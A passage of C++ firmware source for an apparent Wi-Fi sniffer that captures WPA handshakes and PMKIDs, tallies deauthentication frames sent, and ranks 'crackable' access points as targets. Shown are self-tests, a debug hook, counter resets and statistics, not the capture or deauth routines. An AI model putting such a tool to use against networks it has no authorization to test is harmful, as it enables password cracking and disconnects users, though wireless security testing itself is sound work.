      0x00, 0x00,                    // RSN capabilities
      0x01, 0x00,                    // PMKID count
      0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
      0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF};
  const uint8_t *pmkidList = nullptr;
  int assocPmkidCount = parseRsnPmkids(rsnPmkid, sizeof(rsnPmkid), &pmkidList);
  bool assocPmkidOk = assocPmkidCount == 1 && pmkidList != nullptr &&
                      memcmp(pmkidList, expectedPmkid, 16) == 0;

  uint8_t rsnPmf[20] = {
      0x01, 0x00,
      0x00, 0x0F, 0xAC, 0x04,
      0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
      0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
      0xC0, 0x00};  // PMF capable and required
  RsnInfo pmfInfo = parseRsn(rsnPmf, sizeof(rsnPmf));
  bool pmfOk = pmfInfo.pmfCapable && pmfInfo.pmfRequired;

  bool ok = validHs && mismatchRejected && pmkidOk && m2m3Ok && skipOk &&
            assocPmkidOk && pmfOk &&
            (g_hsCount == hsBefore + 2) &&
            (g_pmkidCount == pmkidBefore + 1);

  Serial.printf("{\"t\":\"selftest\",\"ok\":%d,\"stored\":0,\"valid\":%d,\"mismatch\":%d,"
                "\"pmkid\":%d,\"m2m3\":%d,\"skip\":%d,\"assoc_pmkid\":%d,\"pmf\":%d}\n",
                ok ? 1 : 0, validHs ? 1 : 0, mismatchRejected ? 1 : 0,
                pmkidOk ? 1 : 0, m2m3Ok ? 1 : 0, skipOk ? 1 : 0,
                assocPmkidOk ? 1 : 0, pmfOk ? 1 : 0);
}

void snifferDebugRaw(int index) {
  if (index < 0 || index >= g_apCount) {
    Serial.println("{\"t\":\"error\",\"msg\":\"bad AP index\"}");
    return;
  }
  memcpy(g_debugBssid, g_aps[index].bssid, 6);
  g_debugRaw = true;
  g_debugParse = true;
  char bssid[18];
  macStr(g_debugBssid, bssid);
  Serial.printf("{\"t\":\"rawwait\",\"bssid\":\"%s\"}\n", bssid);
}

void snifferClearCounts() {
  g_hsCount = 0;
  // Do not reset g_savedHsCount or g_savedPmkidCount: clear does not erase
  // the PCAP, so SAVED must keep describing the current session file.
  g_pmkidCount = 0;
  g_eapolCount = 0;
  g_deauthSent = 0;
  g_deauthBursts = 0;
  g_drops = 0;
  g_clientDrops = 0;
  // Reset the whole pair state. Leaving m1..m4 set would let the next EAPOL
  // frame re-report a handshake that was already seen.
  for (int i = 0; i < MAX_HS; i++) memset(&g_hs[i], 0, sizeof(g_hs[i]));
  for (int i = 0; i < g_apCount; i++) {
    g_aps[i].handshake = false;
    g_aps[i].pmkid = false;
  }
  Serial.println("{\"t\":\"clear\",\"ok\":1}");
}

SnifferStats snifferStats() {
  SnifferStats s = {};
  s.apCount = g_apCount;
  s.hsCount = g_hsCount;
  s.savedHsCount = g_savedHsCount;
  s.pmkidCount = g_pmkidCount;
  s.savedPmkidCount = g_savedPmkidCount;
  s.eapolCount = g_eapolCount;
  s.drops = (int)g_drops;
  s.clientDrops = g_clientDrops;
  s.channel = g_channel;
  s.sdOk = g_sdOk;
  s.paused = g_paused;
  s.lockMode = g_lockMode;
  s.boost = g_boost;
  s.pcapSize = (int)g_pcapSize;
  s.deauthSent = g_deauthSent;
  s.deauthBursts = g_deauthBursts;

  uint32_t now = millis();
  int clientTotal = 0;
  int activeClients = 0;
  for (int i = 0; i < g_clientCount; i++) {
    if (!g_clients[i].used) continue;
    clientTotal++;
    if (now - g_clients[i].lastSeen <= CLIENT_ACTIVE_MS) {
      activeClients++;
    }
  }
  s.clientCount = clientTotal;
  s.activeClientCount = activeClients;

  int targets = 0;
  int skips = 0;
  int best = -1;
  int8_t bestRssi = -128;
  for (int i = 0; i < g_apCount; i++) {
    if (g_aps[i].skipped) {
      skips++;
      continue;
    }
    if (isCrackableAuth(g_aps[i].auth)) targets++;
    if (!g_aps[i].hidden && g_aps[i].rssi > bestRssi) {
      bestRssi = g_aps[i].rssi;
      best = i;
    }
  }
  if (best < 0) {
    // All visible APs are hidden or skipped: still show the strongest signal.
    for (int i = 0; i < g_apCount; i++) {
      if (g_aps[i].skipped) continue;
      if (g_aps[i].rssi > bestRssi) {
        bestRssi = g_aps[i].rssi;
        best = i;
      }
    }
  }
  s.targetCount = targets;
  s.skipCount = skips;
  if (best >= 0) {
    strlcpy(s.lastSsid, g_aps[best].ssid, sizeof(s.lastSsid));
    s.lastRssi = g_aps[best].rssi;
  } else {
    s.lastSsid[0] = 0;
    s.lastRssi = 0;
  }

  s.hasTarget = g_hasTarget;
  if (g_hasTarget) {
    memcpy(s.targetBssid, g_targetBssid, 6);
    strlcpy(s.targetSsid, g_targetSsid, sizeof(s.targetSsid));
    s.targetChannel = g_targetChannel;
    s.targetRssi = g_targetRssi;
  }
  return s;
}
